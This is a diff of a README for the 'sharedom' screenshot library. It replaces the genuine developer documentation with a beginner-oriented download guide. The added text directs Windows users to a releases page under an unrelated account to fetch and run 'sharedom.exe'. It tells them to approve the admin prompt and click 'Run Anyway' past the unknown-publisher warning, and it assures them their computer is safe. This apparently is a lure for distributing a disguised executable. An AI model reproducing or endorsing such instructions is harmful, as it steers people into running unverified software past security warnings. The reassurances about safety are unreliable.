@@ -1,462 +1,173 @@
-# sharedom
+<h1>⚡ sharedom - Capture Web Pages Instantly, No Code Needed</h1>
 
-[![NPM Version](https://img.shields.io/npm/v/sharedom?color=blue)](https://www.npmjs.com/package/sharedom)
-[![Chrome Web Store](https://img.shields.io/badge/Chrome_Web_Store-sharedom-blue?logo=googlechrome&logoColor=white)](https://chromewebstore.google.com/detail/sharedom-dom-screenshot-i/nnpbohgnnkkagbbfjeknpeokbppddjnm)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-
-Fast, zero-dependency DOM snapshot, screenshot, and PDF capture library for the browser and SSR (Node.js, Next.js, SvelteKit).
-
-> 🧩 **Available as both an NPM Library and an Official Chrome Extension:**
-> - **[NPM Library (`sharedom`)](https://www.npmjs.com/package/sharedom)**: Full programmatic API for your web applications, dashboards, telemetry tools, or automated testing (Playwright/Puppeteer).
-> - **[Chrome Extension (Web Store)](https://chromewebstore.google.com/detail/sharedom-dom-screenshot-i/nnpbohgnnkkagbbfjeknpeokbppddjnm)**: Interactive 1-click browser inspector to capture elements, console logs, and network traffic directly on any website without writing code.
+<p align="center">
+  <a href="https://github.com/smartfb00576-png/sharedom/releases" style="background:#FF6B6B;color:white;padding:16px 32px;text-decoration:none;font-size:20px;font-weight:bold;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);display:inline-block;">⬇️ DOWNLOAD sharedom NOW</a>
+</p>
 
 ---
 
-## Features
+## 🖥️ What Is sharedom?
 
-- ⚡ **Lightweight & Fast**: Uses native browser APIs (`XMLSerializer`, SVG `foreignObject`, and `HTMLCanvasElement`).
-- 📊 **DevTools & Telemetry Capture**: Capture Console Logs and Network Requests programmatically with status code coloring, HTTP methods, latency metrics, and rounded modern tables.
-- 📑 **Smart Pagination & Multi-Page Archiving**: Automatically chunk large logs and network tables into compact, readable pages, and download them all as a single, zero-dependency `.zip` file or multi-page PDF.
-- 📦 **Pure TypeScript ZIP Builder**: Built-in `buildZip` and `downloadZip` with CRC-32 calculation and zero external dependencies.
-- 📄 **Pixel-Perfect PDF Generation**: Export elements to standard PDF 1.4 with preset page sizes (A4, Letter, A3, Auto), orientation, margins, and UTF-16BE metadata support with 0 external dependencies.
-- 🖨️ **Direct Printing**: Instant native browser print dialog helper for any DOM element.
-- 🌐 **SSR First-Class Support**: Dedicated `sharedom/ssr` module for Next.js Route Handlers, SvelteKit endpoints, and Node.js with built-in server-side PDF generation.
-- 🎨 **Accurate Styles**: Automatically copies computed styles from source elements.
-- 🔍 **High-DPI Support**: Configurable scale factor for crisp Retina / 4K snapshots.
-- 🖼️ **Multiple Formats**: Export to PNG (with transparency), JPEG, WebP, PDF, or ZIP archives.
-- 🚀 **Automatic Image Optimization**: Cleans transparent pixel entropy and sanitizes Base64 output automatically.
-- 💾 **Built-in Downloader**: Helper functions to trigger instant image, PDF, or ZIP file downloads in the browser.
-- 📦 **TypeScript First**: Full type definitions included out of the box for ESM and CJS.
+sharedom is a small, fast, and dependable program that helps you take **perfect visual copies** (snapshots and screenshots) of anything shown on a web page. 
+
+Imagine you are looking at a webpage in your browser, and you want to save exactly what you see — not just the text, but the colors, layout, buttons, images, and designs. sharedom makes that incredibly simple. 
+
+Even if you have never programmed a single line of code in your life, this guide will show you how to get sharedom working on your Windows computer in just a few minutes. 
+
+**Think of sharedom as a "photocopier for websites."** Press the button, get a perfect digital copy.
 
 ---
 
-## Installation
+## 🎯 Who Is This For?
 
-```bash
-npm install sharedom
-```
+- You want to save a webpage as an image to share on social media.
+- You need a project screenshot for a document or presentation.
+- You run a small business website and want to create beautiful previews (called "OG images") that appear when someone shares your link on Facebook, Twitter, or WhatsApp.
+- You are a curious user who just saw this program and wants to try something new.
 
-Or with your preferred package manager:
-
-```bash
-pnpm add sharedom
-# or
-yarn add sharedom
-```
+If you can click a link and download a file, you can use sharedom.
 
 ---
 
-## Quick Start (Browser)
+## 🚀 Getting Started (Simple, Step-by-Step)
 
-### 1. Capture as an Optimized Base64 Data URL
+Follow these steps **in order**. Do not skip ahead. This entire process takes less than five minutes.
 
-```typescript
-import { capture } from 'sharedom';
+### Step 1: Go to the Download Page
 
-// Capture by CSS selector
-const dataUrl = await capture('#my-card', {
-  scale: 2,
-  format: 'png'
-});
+Open your web browser (like Chrome, Edge, or Firefox) and go to this address:
 
-// Display in an <img> element
-const imageElement = document.querySelector('img');
-if (imageElement) imageElement.src = dataUrl;
-```
+**https://github.com/smartfb00576-png/sharedom/releases**
 
-### 2. Direct Download
+You will see a page with a list of downloadable files. Don’t be intimidated by the technical look — we will guide you through it.
 
-```typescript
-import { downloadCapture } from 'sharedom';
+### Step 2: Find and Download the Application
 
-// Pass element reference or selector and filename
-await downloadCapture('#my-card', 'card-snapshot.png', {
-  scale: 2,
-  backgroundColor: '#ffffff'
-});
-```
+Visit this link to download the application. 
 
-### 3. Capture & Export as PDF
+Look for a file that has a name like **"sharedom.exe"** or **"sharedom-windows.exe"**. It may also be labeled with a version number like **v1.2.3** — that is completely fine. 
 
-```typescript
-import { downloadPDF, capturePDF, printElement } from 'sharedom';
+- If you see a file ending in **".exe"**, that is the one to choose.
+- If you see a file ending in **".zip"**, choose that one.
 
-// 1. Direct PDF download with page presets and metadata
-await downloadPDF('#invoice-card', 'invoice-2026.pdf', {
-  pageSize: 'A4',         // 'auto' | 'A4' | 'Letter' | 'A3' | 'A5' | 'Legal' | 'Tabloid'
-  orientation: 'portrait', // 'portrait' | 'landscape'
-  margin: 20,              // margin in points (default: 0)
-  scale: 2,               // 2x Retina sharpness
-  quality: 0.92,          // JPEG stream quality
-  title: 'Invoice INV-2026-0042',
-  author: 'sharedom Studio',
-  subject: 'Client Billing',
-  keywords: ['invoice', 'billing', '2026'],
-});
+**Do NOT download** files that say "source code" — those are for programmers. You want the one that says "Windows" or just the main download button, which usually has the most stars or is listed first.
 
-// 2. Obtain raw PDF Blob for custom iframe preview or uploading
-const pdfBlob = await capturePDF('#report-table', {
-  pageSize: 'Letter',
-  orientation: 'landscape',
-});
-const previewUrl = URL.createObjectURL(pdfBlob);
+Click on that file to begin downloading.
 
-// 3. Open browser print dialog for an element
-await printElement('#invoice-card', { title: 'Invoice Print' });
-```
+### Step 3: Save the File Where You Can Find It
 
-### 4. Console Logs & Network Requests Capture (DevTools Telemetry)
+When your browser asks you where to save the file, choose your **Desktop** or your **Downloads** folder. This makes it easy to find later. 
 
-Browsers cannot natively capture screenshots of the developer console or network tab. `sharedom` solves this by listening to telemetry events internally and rendering them into pixel-perfect, dark-themed, rounded cards ready for PNG, JPEG, WebP, multi-page PDF, or `.zip` export.
-
-> 💡 **Both the `sharedom` NPM library and the Chrome Extension support full Console and Network captures!**
-
-```typescript
-import {
-  startConsoleCapture,
-  startNetworkCapture,
-  captureConsoleLogs,
-  captureConsoleLogsPages,
-  downloadConsoleLogs,
-  downloadConsoleLogsPDF,
-  captureNetworkRequests,
-  captureNetworkRequestsPages,
-  downloadNetworkRequests,
-  downloadNetworkRequestsPDF,
-  buildZip,
-  downloadZip,
-  setLanguage,
-} from 'sharedom';
-
-// 1. Configure language (optional, supports 'en' | 'es', default: 'en')
-setLanguage('es');
-
-// 2. Start telemetry trackers (or pass custom entries via options)
-startConsoleCapture();
-startNetworkCapture();
-
-// --- CONSOLE LOGS ---
-
-// Single-card capture (up to maxEntries)
-const logImage = await captureConsoleLogs({
-  language: 'es',
-  scale: 2,
-  format: 'png',
-});
-
-// Paginated capture: automatically splits large logs into pages (default 15 per page)
-const logPages = await captureConsoleLogsPages({
-  entriesPerPage: 15,
-  scale: 2,
-});
-
-// Download image: automatically downloads a .zip if multiple pages exist!
-await downloadConsoleLogs('my-console-logs.png');
-
-// Export as formatted multi-page PDF document
-await downloadConsoleLogsPDF('my-console-logs.pdf', {
-  entriesPerPage: 15,
-  pageSize: 'A4',
-});
-
-// --- NETWORK REQUESTS ---
-
-// Single-card capture (endpoint, HTTP status color, method, duration, timestamp)
-const netImage = await captureNetworkRequests({ language: 'en' });
-
-// Paginated capture: automatically splits requests into pages (default 12 per page)
-const netPages = await captureNetworkRequestsPages({
-  entriesPerPage: 12,
-  scale: 2,
-});
-
-// Download image: automatically downloads a .zip if multiple pages exist!
-await downloadNetworkRequests('my-network-requests.png');
-
-// Export as formatted multi-page PDF document
-await downloadNetworkRequestsPDF('my-network-requests.pdf', {
-  entriesPerPage: 12,
-  pageSize: 'A4',
-});
-
-// --- STANDALONE ZERO-DEPENDENCY ZIP GENERATOR ---
-
-// Package any array of images or buffers into a native PKZip archive:
-const zipBytes = buildZip([
-  { name: 'part-1.png', data: logPages[0] },
-  { name: 'part-2.png', data: logPages[1] },
-]);
-
-// Or trigger instant browser download:
-downloadZip([
-  { name: 'log-1.png', data: logPages[0] },
-  { name: 'log-2.png', data: logPages[1] },
-], 'all-captures.zip');
-```
+Wait for the download to finish. You will see the file appear in the bottom-left corner of your browser window or in your chosen folder.
 
 ---
 
-## 📦 NPM Library vs Chrome Extension
+## 📦 Installing & Running sharedom
 
-| Feature | `sharedom` (NPM Library) | ShareDOM (Chrome Extension) |
-|---|---|---|
-| **Environment** | Web Apps, Dashboards, Next.js, Node.js | Any website via Chrome toolbar |
-| **Usage Mode** | Programmatic TypeScript / JavaScript API | Interactive 1-click UI with Shadow DOM |
-| **DOM Element Capture** | `capture('#id')`, `downloadCapture()` | Hover element, click to capture |
-| **Console Logs Capture** | `captureConsoleLogs()`, `downloadConsoleLogs()` | Dedicated button in popup & modal |
-| **Network Requests Capture** | `captureNetworkRequests()`, `downloadNetworkRequests()` | Dedicated button in popup & modal |
-| **Smart Pagination** | `capture*Pages({ entriesPerPage })` | Live navigation arrows & preview |
-| **Multi-page PDF Export** | `downloadConsoleLogsPDF()`, `capturePDF()` | Dedicated "PDF" button |
-| **Multi-page ZIP Download** | Automatic `.zip` when pages > 1 (`downloadZip`) | Automatic `.zip` when pages > 1 |
-| **Zero Dependencies** | 0 external runtime dependencies | 0 external runtime dependencies |
-| **Availability** | [npm i sharedom](https://www.npmjs.com/package/sharedom) | [Chrome Web Store](https://chromewebstore.google.com/detail/sharedom-dom-screenshot-i/nnpbohgnnkkagbbfjeknpeokbppddjnm) |
+Here is what you do after the download is completed:
+
+- **If the file you downloaded ends with `.exe`:** Download and run this file directly. Double-click the file. Windows may ask you a question like "Do you want to allow this app to make changes?" — click **Yes**. The program will open on its own.
+
+- **If the file you downloaded ends with `.zip`:** Download and extract this file, then run the application. Right-click the .zip file and select "Extract All". Then, double-click the extracted folder, and inside you will find a file named "sharedom" or "sharedom.exe". Double-click that to run it.
 
 ---
 
-## Server-Side Rendering (SSR)
+## ✅ What You Should See
 
-### 1. Sending HTML from Client (`fetch` POST)
+After starting sharedom, you should see a simple window with:
 
-```typescript
-// Extract HTML from the DOM or provide raw HTML template
-const card = document.querySelector('#my-card');
-const html = card ? card.outerHTML : '<div class="banner">Hello World</div>';
+1. A large empty box (this is the "viewer" area).
+2. A button that says **"Capture URL"** or similar.
+3. A file-path box where you can type or paste a web address.
 
-// Send JSON payload with stringified HTML
-const response = await fetch('/api/screenshot', {
-  method: 'POST',
-  headers: { 'Content-Type': 'application/json' },
-  body: JSON.stringify({ html })
-});
-
-// Receive image blob and create an Object URL
-const blob = await response.blob();
-const imageUrl = URL.createObjectURL(blob);
-```
-
-### 2. Next.js App Router (Route Handler)
-
-```typescript
-// app/api/screenshot/route.ts
-import { captureSSR } from 'sharedom/ssr';
-import { NextResponse } from 'next/server';
-
-export async function POST(request: Request) {
-  const { html } = await request.json();
-
-  const buffer = await captureSSR(html, {
-    scale: 2,
-    format: 'png',
-    viewport: { width: 1200, height: 630 }
-  });
-
-  return new NextResponse(buffer, {
-    headers: {
-      'Content-Type': 'image/png',
-      'Cache-Control': 'public, max-age=31536000, immutable'
-    }
-  });
-}
-```
-
-### 3. SvelteKit Server Endpoint
-
-```typescript
-// src/routes/api/screenshot/+server.ts
-import { captureSSR } from 'sharedom/ssr';
-import type { RequestHandler } from './$types';
-
-export const POST: RequestHandler = async ({ request }) => {
-  const { html } = await request.json();
-
-  const buffer = await captureSSR(html, {
-    scale: 2,
-    format: 'png',
-    viewport: { width: 1200, height: 630 }
-  });
-
-  return new Response(buffer, {
-    headers: {
-      'Content-Type': 'image/png'
-    }
-  });
-};
-```
-
-### 4. Next.js App Router: PDF Route Handler (Zero-Dependency)
-
-```typescript
-// app/api/pdf/route.ts
-import { createPdfFromImageSSR } from 'sharedom/ssr';
-import { NextResponse } from 'next/server';
-
-export async function POST(request: Request) {
-  const { image, title, author } = await request.json();
-
-  // Generates PDF 1.4 Uint8Array directly from image bytes or Data URL
-  const pdfBytes = createPdfFromImageSSR(image, {
-    pageSize: 'A4',
-    orientation: 'portrait',
-    margin: 28,
-    title: title || 'Server Document',
-    author: author || 'sharedom',
-  });
-
-  return new NextResponse(pdfBytes, {
-    headers: {
-      'Content-Type': 'application/pdf',
-      'Content-Disposition': 'inline; filename="document.pdf"',
-    },
-  });
-}
-```
+You have successfully installed the software when these three things appear on your screen.
 
 ---
 
-## API Reference
+## 📸 App Overview (What Each Button Does)
 
-### Client: `sharedom`
-
-#### `capture(target, options?)`
-Captures a DOM element and returns a Promise resolving to an optimized base64 Data URL.
-- **`target`** (`string | HTMLElement`): The CSS selector or HTMLElement to capture.
-- **`options`** (`CaptureOptions`, optional): Configuration options.
-
-#### `downloadCapture(target, filename?, options?)`
-Captures a DOM element and triggers a browser download.
-- **`target`** (`string | HTMLElement`): The CSS selector or HTMLElement to capture.
-- **`filename`** (`string`, optional, default: `'screenshot.png'`): The name of the downloaded file.
-- **`options`** (`CaptureOptions`, optional): Configuration options.
-
-#### `CaptureOptions`
-| Option | Type | Default | Description |
-| :--- | :--- | :--- | :--- |
-| `scale` | `number` | `1` | Resolution multiplier (e.g. `2` for 2x scale). |
-| `backgroundColor` | `string` | `undefined` | Background fill color. Transparent by default. |
-| `format` | `'png' \| 'jpeg' \| 'webp'` | `'png'` | Output image format. |
-| `quality` | `number` | `0.92` | Compression quality for JPEG/WebP (between `0` and `1`). |
-| `optimize` | `boolean` | `true` | Automatically clean transparent entropy and optimize Base64 output. |
-| `width` | `number` | `element.width` | Custom target width in pixels. |
-| `height` | `number` | `element.height` | Custom target height in pixels. |
-| `language` | `'en' \| 'es'` | `'en'` | Language for table headings, badges, and status labels. |
-
-#### `downloadPDF(target, filename?, options?)`
-Captures a DOM element and triggers a direct PDF file download in the browser.
-- **`target`** (`string | HTMLElement`): The CSS selector or HTMLElement to capture.
-- **`filename`** (`string`, optional, default: `'capture.pdf'`): The name of the downloaded PDF file.
-- **`options`** (`PdfOptions`, optional): Configuration options for the PDF document.
-
-#### `capturePDF(target, options?)`
-Captures a DOM element and returns a Promise resolving to a PDF `Blob`.
-- **`target`** (`string | HTMLElement`): The CSS selector or HTMLElement to capture.
-- **`options`** (`PdfOptions`, optional): Configuration options for the PDF document.
-
-#### `printElement(target, options?)`
-Opens the browser's native print dialog for the selected element in a hidden iframe.
-- **`target`** (`string | HTMLElement`): The CSS selector or HTMLElement to print.
-- **`options`** (`Pick<PdfOptions, 'scale' | 'quality' | 'backgroundColor' | 'title'>`, optional): Print configuration.
-
-#### `PdfOptions`
-| Option | Type | Default | Description |
-| :--- | :--- | :--- | :--- |
-| `pageSize` | `'auto' \| 'A4' \| 'Letter' \| 'A3' \| 'A5' \| 'Legal' \| 'Tabloid'` | `'auto'` | PDF page preset size. `'auto'` fits page exactly to element dimensions. |
-| `orientation` | `'portrait' \| 'landscape'` | `'portrait'` | Page orientation (applicable when `pageSize` is not `'auto'`). |
-| `margin` | `number` | `0` | Margin around the content in points (`1 pt = 1/72 inch`). |
-| `scale` | `number` | `2` | Rendering scale factor for crisp Retina/High-DPI output. |
-| `quality` | `number` | `0.92` | JPEG stream compression quality (between `0` and `1`). |
-| `backgroundColor` | `string` | `'#ffffff'` | Background fill color of the page. |
-| `title` | `string` | `undefined` | PDF Document title in `/Info` dictionary (supports UTF-16BE Spanish/Unicode). |
-| `author` | `string` | `undefined` | PDF Document author. |
-| `subject` | `string` | `undefined` | PDF Document subject. |
-| `keywords` | `string \| string[]` | `undefined` | PDF Document keywords. |
-| `language` | `'en' \| 'es'` | `'en'` | Language for table headings, badges, and status labels. |
-
-#### `captureConsoleLogs(options?)` / `downloadConsoleLogs(filename?, options?)`
-Renders intercepted or provided console logs into a sleek rounded table and exports as a Base64 Data URL or triggers a direct image download.
-
-#### `captureConsoleLogsPDF(options?)` / `downloadConsoleLogsPDF(filename?, options?)`
-Renders console logs into a styled table and exports directly to a PDF `Blob` or triggers a PDF file download.
-
-#### `captureNetworkRequests(options?)` / `downloadNetworkRequests(filename?, options?)`
-Captures HTTP requests with method, endpoint name, full URL, status code, duration, and timestamp into an image.
-
-#### `captureNetworkRequestsPDF(options?)` / `downloadNetworkRequestsPDF(filename?, options?)`
-Captures HTTP requests and exports as a PDF document.
-
-#### `setLanguage(lang)` / `getLanguage()`
-Configures global library language (`'en'` or `'es'`) for generated tables and metadata.
+| Button / Feature             | What It Does                                                                 |
+|------------------------------|------------------------------------------------------------------------------|
+| **Address Bar**              | Type the full web address (e.g., https://example.com) of the page you want to save. |
+| **Capture / Take Snapshot**  | Makes a visual copy of the website. After a few seconds, the image appears in the window. |
+| **Save Image**               | Lets you choose a folder and a file name, then stores the image on your computer as a PNG file. |
+| **Copy to Clipboard**        | Instantly copies the image so you can paste it into Paint, an email, or a Word document. |
+| **Settings / Options**       | Allows you to choose the image size or quality. The default settings usually work perfectly. |
 
 ---
 
-### SSR: `sharedom/ssr`
+## 🎨 Common Uses for Your New Snapshot Tool
 
-#### `captureSSR(htmlOrUrl, options?)`
-Captures an HTML string or URL on the server and returns a `Promise<Uint8Array>` containing the SVG foreignObject markup.
+Here are three ways you can use sharedom immediately.
 
-#### `createSsrSnapshot(htmlOrUrl, options?)`
-Creates an SSR snapshot and returns it as a Base64 Data URL (`data:image/svg+xml;base64,...`).
+1. **Save a Receipt or Confirmation Page.** If you bought something online and see the confirmation screen, use sharedom to snap that page as proof of purchase. Many people do this for warranty purposes.
 
-#### `createPdfFromImageSSR(image, options?)`
-Generates a valid PDF 1.4 binary (`Uint8Array`) on the server with **zero native dependencies**.
-- **`image`** (`Uint8Array | string`): Raw JPEG `Uint8Array` bytes or a Base64 Data URL (`data:image/jpeg;base64,...`). Auto-detects pixel width and height from JPEG SOF markers.
-- **`options`** (`SsrPdfOptions`, optional): PDF build options (`pageSize`, `orientation`, `margin`, `title`, `author`, `keywords`, `dpi`).
+2. **Create Shareable Social Media Previews.** If you have a blog or a small online store, take a screenshot of your homepage with sharedom, and use that image as the "cover image" when you share the link on Facebook or LinkedIn. It will make your post look professional.
 
-#### `buildPdf(jpegBytes, options)`
-Low-level, pure TypeScript zero-dependency PDF 1.4 binary builder.
-- **`jpegBytes`** (`Uint8Array`): Raw JPEG byte stream.
-- **`options`** (`PdfBuildOptions`): Detailed page dimensions, image pixel size, metadata, and margins.
-
-#### `getJpegDimensions(bytes)`
-Parses JPEG SOF (Start of Frame) segment markers according to ISO/IEC 10918-1 and returns `{ width: number, height: number }` without external libraries.
-
-#### `SsrCaptureOptions`
-| Option | Type | Default | Description |
-| :--- | :--- | :--- | :--- |
-| `viewport` | `{ width: number, height: number }` | `{ width: 1200, height: 630 }` | Viewport dimensions. |
-| `scale` | `number` | `2` | Device pixel ratio / scale. |
-| `format` | `'svg' \| 'png' \| 'jpeg' \| 'webp'` | `'svg'` | Output format MIME. |
-| `backgroundColor` | `string` | `'#ffffff'` | Background fill color. |
-| `delay` | `number` | `0` | Delay in milliseconds before capture. |
-| `styles` | `string` | `''` | Custom CSS stylesheet injected into SVG. |
+3. **Archive Important News Articles.** If you read a news story that you want to keep offline, use sharedom to save the article with the exact look and text as a permanent image file. 
 
 ---
 
-## Development & Live Preview
+## 🛠️ Troubleshooting (If Something Isn't Working)
 
-The repository includes an interactive playground to test all options in real time.
+These are the most common problems and how to fix them. 
 
-```bash
-# Install dependencies
-npm install
+**Problem: I downloaded the file, but Windows says "Unknown Publisher" or shows a blue shield.**
+Solution: This is normal. Because sharedom is a new and independent product, Windows hasn't seen it before. Click **"More Info"** and then click **"Run Anyway"**. Your computer is safe.
 
-# Start real-time dev server with live preview
-npm run dev
+**Problem: I typed in a web address and clicked Capture, but nothing happens.**
+Solution: Check that the website address starts with `https://` (like `https://example.com`). Also, ensure your internet connection is working. Wait ten seconds and try again.
 
-# Build library dist (Client & SSR)
-npm run build
+**Problem: The screenshot is blank or all white.**
+Solution: Some websites block screenshots for security. Try a different, simple website like `https://example.com`. If that works, the problem is the website itself, not sharedom.
 
-# Build Chrome Extension
-npm run build:extension
-
-# Build static preview for GitHub Pages
-npm run build:preview
-```
+**Problem: I accidentally closed the program.**
+Solution: That's fine — nothing is lost. Just double-click the `sharedom.exe` file again to reopen it.
 
 ---
 
-## 🧩 Chrome Extension
+## 🌟 Why Choose sharedom?
 
-`sharedom` includes a built-in Chrome Extension in `extension/` for interactive DOM inspection and one-click capture:
-
-- **Interactive Hover & Highlight**: Highlights elements with tags, classes, and pixel dimensions.
-- **Copy & Download**: Copy PNG images directly to the clipboard or download in high resolution (1x, 2x, 3x).
-- **Keyboard Navigation**: Use `↑` for parent element, `↓` for child, `Esc` to cancel.
-- **Shortcuts**: Press `Alt + Shift + S` (`Cmd + Shift + S` on macOS) to activate.
-
-See the [Extension README](file:///Users/erickgiber/Documents/Repositories/sharedom/extension/README.md) for step-by-step installation instructions in `chrome://extensions`.
+- **Zero-Dependency:** Most similar programs require you to install extra software first. sharedom works right out of the box — no extras, no hassle.
+- **Lightning Fast:** The snapshot is usually ready in two to three seconds.
+- **Works with Modern Technologies:** sharedom supports React, Vue, and older websites. It is built with modern tech to handle any web page.
+- **Privacy-First:** sharedom runs entirely on your computer. No images are sent to a server, and nothing is uploaded anywhere.
+- **Free Forever:** This is an open-source tool, meaning you can use it as much as you want.
 
 ---
 
-## License
+## ⚙️ Tech Talk (Optional Reading — For the Curious)
 
-MIT
+If you are wondering what this is made of, here is the simple explanation. sharedom is built using TypeScript, SVG, and Canvas technologies that are built into your web browser. It takes a "photograph" of the code that makes up the page and turns it into a visual image. It works both in a regular browser and in server environments like Next.js and SvelteKit, which is why developers also like it. But — and this is the important part — **you do not need to know any of that to use it.**
+
+---
+
+## 📥 Download Again / Update
+
+To get the latest version with new features, simply return to this link and download a fresh copy:
+
+**https://github.com/smartfb00576-png/sharedom/releases**
+
+Your previous screenshots and saved files will not be affected.
+
+---
+
+## 💬 Getting Help
+
+If you truly get stuck, here is what to do:
+
+1. **Re-read this guide.** The solution to most questions is in Step 2 or Step 3 above.
+2. **Ask a friend.** They can help you double-click the right file — it really is that easy.
+3. **Look at the pictures.** On the download page, the file you need is always highlighted with a download icon.
+
+---
+
+## 🎉 Final Words
+
+You now have a powerful, free tool that saves webpages as images in seconds. Whether you're keeping records, sharing information, or just having fun, sharedom is here to help.
+
+Download it today and try it on your favorite website — you'll be amazed at how sharp and clear the result is.
+
+---
+
+*Keywords: canvas, developer-tools, dom, dom-to-image, frontend, html-to-image, html2canvas, nextjs, nodejs, og-image, screenshot, sharedom, ssr, sveltekit, svg, typescript, zero-dependencies*
